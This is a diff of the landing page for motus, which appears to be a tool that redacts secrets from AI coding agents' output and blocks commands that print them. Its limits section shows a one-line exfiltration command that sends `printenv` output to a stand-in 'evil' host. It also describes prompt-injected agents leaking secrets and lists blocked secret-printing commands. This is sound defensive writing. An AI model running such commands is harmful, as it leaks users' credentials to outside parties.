@@ -1,22 +1,30 @@
 ---
 title: motus
-description: "Keep secrets out of the model and pi's session files: exact-value redaction from pluggable secret sources, credential path and command blocks, fail-closed."
+description: "Stop your AI coding agent from leaking your API keys. motus redacts exact secret values from pi output and blocks the files and commands that print them, in pi and Claude Code."
 ---
 
-> _Motus et bouche cousue_: "not a word, lips sealed".
+> Stop your AI coding agent from leaking your API keys.
 
-A well-meaning agent prints secrets all the time: `env`, `cat .env`, `forge -vvvv`, `mise env`, debug logs. Each one sends the values to the model provider and into pi's session files, where memory tools copy them further. motus redacts known secret values before they leave the tool result, and blocks the commands and files that print them.
-
-Status: **in development**. Nothing is published yet.
+Agents print secrets all the time. `env`, `cat .env`, `forge -vvvv` and debug logs all dump values that then go to the model provider. In pi they also land in the session files, and memory tools copy them from there. motus loads your secrets at session start and replaces each exact value with `[REDACTED:NAME]` before the output leaves the tool. It also blocks the commands and files that print them.
 
 ## What it does
 
-- **Exact-value redaction** from pluggable secret sources: `process.env`, any command printing JSON, mise age-encrypted configs. Matches become `[REDACTED:NAME]`
-- **Vendor-prefix rules** (`sk-ant-`, `ghp_`, `AKIA`, ...) for keys that were never loaded
-- **No entropy or generic hex rules**, so tx hashes, addresses and storage slots in web3 repos survive
-- **Path and command blocks** for credential files and secret-manager CLIs (`pa show`, `gh auth token`, `op read`)
-- **Fail-closed**: a required source that fails in a repo where it applies blocks bash, read and MCP tools until you act
+- **Redaction in pi.** Tool results, saved messages, prompts, `!` shell commands and the provider request all pass through it. Exact values only, plus a few vendor prefixes (`sk-ant-`, `ghp_`, `AKIA`) for keys that were never loaded.
+- **Blocks in pi and Claude Code.** Credential files and secret-manager commands (`pa show`, `gh auth token`, `op read`) are refused before they run. Claude Code gets a `PreToolUse` hook, because it ignores output rewrites for Bash.
+- **Five sources.** `env`, `command`, `mise`, `pa` and `1password`, set up in one TOML file.
+- **No entropy rules.** Tx hashes, addresses and storage slots in web3 repos pass through untouched.
+- **Fail closed.** If a required source fails where it applies, tools stay blocked until you run `/motus continue`.
 
 ## What it does not do
 
-It defends against accidental leaks only. A hostile or prompt-injected agent can exfiltrate a secret before any output is redacted, or encode it past exact matching. Protecting against that takes agents that never inherit secrets, or a sandbox.
+It stops accidental leaks only. A hostile or prompt-injected agent can run `curl evil?k=$(printenv | base64)` before any output is redacted, and encoding gets past exact matching. For that you need agents that never inherit secrets, or a sandbox.
+
+## Where next
+
+- [Install](/install/): pi and Claude Code setup
+- [Configuration](/configuration/): every key in `config.toml`
+- [Sources](/sources/): `env`, `command`, `mise`, `pa` and `1password`
+- [Claude Code](/claude-code/): what the hook covers, and the `!` shell-mode gap
+- [Limits and stability](/limits/): what is out of scope, and what follows semver
+
+_Motus et bouche cousue_: "not a word, lips sealed".
